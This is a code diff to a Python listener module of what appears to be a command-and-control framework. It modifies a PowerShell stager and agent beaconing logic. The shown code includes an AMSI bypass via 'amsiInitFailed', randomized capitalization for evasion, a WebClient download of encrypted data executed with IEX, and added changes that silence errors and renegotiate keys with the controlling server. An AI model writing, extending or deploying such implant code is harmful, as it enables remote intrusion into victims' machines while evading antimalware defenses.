@@ -71,6 +71,16 @@ class Listener:
                 'Description'   :   'Folder to output redirectors to.',
                 'Required'      :   True,
                 'Value'         :   '/tmp/http_hop/'
+            },
+            'SlackToken' : {
+                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SlackChannel' : {
+                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
+                'Required'      :   False,
+                'Value'         :   '#general'
             }
         }
 
@@ -124,7 +134,7 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = ''
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
@@ -149,7 +159,7 @@ class Listener:
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
-                    stager += "}"
+                    stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
@@ -212,7 +222,7 @@ class Listener:
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    stager = helpers.obfuscate(stager, self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
@@ -409,6 +419,10 @@ class Listener:
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                        # restart key negotiation
+                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
+                                    }
                                 }
                             }
                         }
@@ -456,7 +470,9 @@ def send_message(packets=None):
     except urllib2.HTTPError as HTTPError:
         # if the server is reached, but returns an erro (like 404)
         missedCheckins = missedCheckins + 1
-        return (HTTPError.code, '')
+        #if signaled for restaging, exit.
+        if HTTPError.code == 401:
+            sys.exit(0)
 
     except urllib2.URLError as URLerror:
         # if the server cannot be reached
